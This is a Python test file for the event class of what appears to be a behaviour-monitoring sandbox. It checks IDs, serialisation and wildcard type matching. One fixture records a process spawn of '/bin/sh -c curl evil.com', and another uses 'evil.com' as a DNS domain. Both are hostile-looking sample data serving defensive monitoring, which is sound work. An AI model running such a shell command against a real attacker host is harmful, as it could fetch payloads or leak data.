"""Tests for BehavioralEvent and the event type taxonomy."""

from nyuwaymcpsandbox.sandbox.events import (
    EVT_NETWORK_DNS,
    EVT_NETWORK_HTTP,
    EVT_PROCESS_SPAWN,
    SRC_NETWORK,
    SRC_PROCESS,
    BehavioralEvent,
)


def _make_event(type_=EVT_NETWORK_DNS, source=SRC_NETWORK, ts=1.0, payload=None, triggered_by=None):
    return BehavioralEvent(
        type=type_,
        source=source,
        timestamp=ts,
        payload=payload or {},
        triggered_by=triggered_by,
    )


def test_event_gets_unique_id_by_default():
    a = _make_event()
    b = _make_event()
    assert a.event_id != b.event_id
    assert len(a.event_id) > 0


def test_event_to_dict_round_trips_fields():
    e = _make_event(payload={"domain": "evil.com"}, triggered_by="abc123")
    d = e.to_dict()
    assert d["type"] == EVT_NETWORK_DNS
    assert d["source"] == SRC_NETWORK
    assert d["timestamp"] == 1.0
    assert d["payload"] == {"domain": "evil.com"}
    assert d["triggered_by"] == "abc123"
    assert d["event_id"] == e.event_id


def test_event_timestamp_rounded_in_dict():
    """Sub-microsecond precision is rounded to keep JSON output stable."""
    e = _make_event(ts=1.0000001234567)
    assert e.to_dict()["timestamp"] == round(1.0000001234567, 6)


def test_matches_type_exact():
    e = _make_event(type_=EVT_NETWORK_DNS)
    assert e.matches_type(EVT_NETWORK_DNS)
    assert not e.matches_type(EVT_NETWORK_HTTP)


def test_matches_type_prefix_wildcard():
    e = _make_event(type_=EVT_NETWORK_DNS)
    assert e.matches_type("network.*")
    assert not e.matches_type("filesystem.*")


def test_prefix_wildcard_matches_segment_boundary_only():
    """'network.*' must not match a hypothetical 'networking.x' event."""
    e = BehavioralEvent(type="networking.x", source=SRC_NETWORK, timestamp=0.0)
    assert not e.matches_type("network.*")


def test_prefix_wildcard_matches_exact_root():
    """'network.*' should also match 'network' on its own if that were a type."""
    e = BehavioralEvent(type="network", source=SRC_NETWORK, timestamp=0.0)
    assert e.matches_type("network.*")


def test_process_spawn_event_payload():
    """Sanity check: a typical process.spawn payload survives serialization."""
    e = _make_event(
        type_=EVT_PROCESS_SPAWN,
        source=SRC_PROCESS,
        payload={"argv": ["/bin/sh", "-c", "curl evil.com"], "pid": 4242},
    )
    d = e.to_dict()
    assert d["type"] == EVT_PROCESS_SPAWN
    assert d["payload"]["argv"][0] == "/bin/sh"
